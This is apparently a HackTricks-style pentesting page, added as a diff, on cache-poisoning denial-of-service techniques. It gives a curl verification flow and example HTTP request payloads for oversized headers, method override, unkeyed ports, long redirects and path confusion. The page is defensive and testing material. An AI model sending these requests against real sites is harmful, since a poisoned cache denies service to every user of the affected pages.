@@ -1,0 +1,182 @@
+# Cache Poisoning to DoS
+
+{{#include ../../banners/hacktricks-training.md}}
+
+> [!CAUTION]
+> These techniques try to make the **origin return an error, a blank body, or a broken redirect** for a request that the **cache still considers valid/cacheable**. Once stored, the poisoned object can deny access to every user hitting the same cache key.
+
+> [!TIP]
+> Confirm CPDoS with the **lowest blast radius possible**: send a **baseline** request, then the **poisoning** request, and finally a **validation** request without the malicious input. Compare **status**, **body length**, and cache headers such as **`X-Cache`**, **`CF-Cache-Status`**, **`Cache-Status`**, or **`Age`**. If possible, use a sacrificial endpoint or an unkeyed cache buster first.<sup>[[2]](#references)</sup>
+
+If the issue depends on **path confusion**, **static extensions/directories**, or other URL parser discrepancies, first check [Cache Poisoning via URL discrepancies](cache-poisoning-via-url-discrepancies.md).
+
+## Quick verification flow
+
+```bash
+url='https://target.tld/app.js'
+
+# 1) Baseline
+curl -isk "$url" | egrep -i '^(HTTP/|x-cache:|cf-cache-status:|cache-status:|age:|content-length:)'
+
+# 2) Poison attempt
+curl -isk -H 'X-HTTP-Method-Override: HEAD' "$url" | egrep -i '^(HTTP/|x-cache:|cf-cache-status:|cache-status:|age:|content-length:)'
+
+# 3) Validation
+curl -isk "$url" | egrep -i '^(HTTP/|x-cache:|cf-cache-status:|cache-status:|age:|content-length:)'
+```
+
+## Common cache poisoning-to-DoS primitives
+
+### HTTP Header Oversize (HHO)
+
+Send a request with a header block that is **accepted by the cache** but **rejected by the origin**. If the resulting 4xx page is cached, later normal requests will get the cached error.
+
+```http
+GET / HTTP/1.1
+Host: redacted.com
+X-Oversized-Header: Big-Value-00000000000000000000000000000000000000000000000000
+```
+
+This is especially interesting when the **CDN/header limit is larger than the origin/framework limit**.<sup>[[1]](#references)</sup>
+
+### HTTP Meta Character (HMC) & unexpected values
+
+Send **control/meta characters** such as **`\0`**, **`\b`**, **`\r`**, or **`\n`**, or malformed values that the cache forwards but the origin refuses. Some origins also error on syntactically valid-but-unexpected values such as a bogus `Content-Type`.
+
+```http
+GET / HTTP/1.1
+Host: redacted.com
+X-Metachar-Header: \0
+```
+
+```http
+GET /anas/repos HTTP/2
+Host: redacted.com
+Content-Type: HelloWorld
+```
+
+A badly configured parser may also fail on values such as `\:`.<sup>[[1]](#references)</sup>
+
+### Unkeyed header that triggers an error
+
+Some backends return an error or denial page when they see specific headers, but the cache key doesn't vary on that header.
+
+```http
+GET /app.js HTTP/2
+Host: redacted.com
+X-Amz-Website-Location-Redirect: someThing
+
+HTTP/2 403 Forbidden
+X-Cache: hit
+
+Invalid Header
+```
+
+Also test `Forwarded`, `X-Forwarded-Host`, `X-Forwarded-Port`, and application-specific routing headers when they influence redirects or origin routing.<sup>[[2]](#references)</sup>
+
+### HTTP Method Override Attack (HMO)
+
+If the application or middleware supports method override headers such as `X-HTTP-Method-Override`, `X-HTTP-Method`, or `X-Method-Override`, you may be able to transform a normal `GET` into an unsupported or body-less method at the origin while the cache still stores the response under the `GET` key.
+
+```http
+GET /app.js HTTP/1.1
+Host: redacted.com
+X-HTTP-Method-Override: HEAD
+```
+
+`HEAD`, `TRACE`, `PUT`, `DELETE`, and `POST` are worth testing. `HEAD` is especially attractive because some stacks reply `200 OK` with `Content-Length: 0`, effectively blanking the asset for everyone.<sup>[[1]](#references)</sup>
+
+### Unkeyed Port
+
+If the port in the `Host` header is reflected in the response but excluded from the cache key, it may be possible to poison a redirect to an unused port:<sup>[[2]](#references)</sup>
+
+```http
+GET /index.html HTTP/1.1
+Host: redacted.com:1
+
+HTTP/1.1 301 Moved Permanently
+Location: https://redacted.com:1/en/index.html
+X-Cache: miss
+```
+
+### Long Redirect DoS
+
+If an unkeyed parameter is copied into a redirect target, you may be able to make the cache store a redirect that later resolves into `414 URI Too Large`, `431 Request Header Fields Too Large`, or another error on the follow-up request.
+
+```http
+GET /login?x=veryLongUrl HTTP/1.1
+Host: www.cloudflare.com
+
+HTTP/1.1 301 Moved Permanently
+Location: /login/?x=veryLongUrl
+CF-Cache-Status: HIT
+
+GET /login/?x=veryLongUrl HTTP/1.1
+Host: www.cloudflare.com
+
+HTTP/1.1 414 Request-URI Too Large
+CF-Cache-Status: MISS
+```
+
+### Host header case normalization
+
+The `Host` header is case-insensitive, but some origins or routing layers still behave differently depending on casing. If the cache normalizes the host for the key while the origin uses the raw value, a mixed-case `Host` can poison the canonical cache bucket:
+
+```http
+GET /img.png HTTP/1.1
+Host: Cdn.redacted.com
+
+HTTP/1.1 404 Not Found
+X-Cache: miss
+
+Not Found
+```
+
+### Path normalization / static-rule confusion
+
+Some caches normalize or classify the path differently from the origin. A path that looks cacheable to the front-end (`/assets/...`, `.css`, `.js`, dot-segments, encoded dots, delimiters) may map to a dynamic route on the origin that returns an error or blank response. If the static-looking key is cached, the dynamic endpoint becomes unavailable through that cache key.
+
+```http
+GET /api/v1%2e1/user HTTP/1.1
+Host: redacted.com
+
+HTTP/1.1 404 Not Found
+X-Cache: miss
+
+Not Found
+```
+
+For delimiter/static-extension/static-directory tricks, see [Cache Poisoning via URL discrepancies](cache-poisoning-via-url-discrepancies.md).
+
+### Fat GET
+
+Some caches/origins reject **`GET` with a body**, or the origin reads parameters from the body while the cache keys only on the URL. This can poison an error or unexpected response under the clean `GET` cache key.
+
+```http
+GET /index.html HTTP/2
+Host: redacted.com
+Content-Length: 3
+
+xyz
+
+HTTP/2 403 Forbidden
+X-Cache: hit
+```
+
+### Framework / internal cache poisoning
+
+Recent framework bugs showed that **CPDoS is not limited to classic 4xx/5xx cache poisoning at the CDN layer**. Internal framework caches or upstream CDNs may also store:
+
+- a **`204 No Content`** response for a normally populated static/ISR page
+- a **`200 OK`** response with **`Content-Length: 0`**
+- a response that was supposed to stay **`private, no-store`** but is coerced into **`s-maxage`** / **`stale-while-revalidate`**
+
+In practice, this means a single crafted request can blank an HTML page or JS asset without needing a traditional error page. When testing modern frameworks, compare the same endpoint with and without framework-specific cache/data headers and watch for changes in **`Cache-Control`**, **body length**, and shared-cache headers. If you are assessing a Next.js target, also check [the Next.js page](../../network-services-pentesting/pentesting-web/nextjs.md) for framework-specific cache poisoning bugs.<sup>[[3]](#references)</sup>
+
+## References
+
+- [1] [CPDoS.org – Cache-Poisoning Denial-of-Service (CPDoS) Attacks](https://cpdos.org/)
+- [2] [Responsible denial of service with web cache poisoning](https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning)
+- [3] [Next.JS vulnerability can lead to DoS via cache poisoning](https://github.com/advisories/GHSA-67rr-84xm-4c7r)
+
+{{#include ../../banners/hacktricks-training.md}}
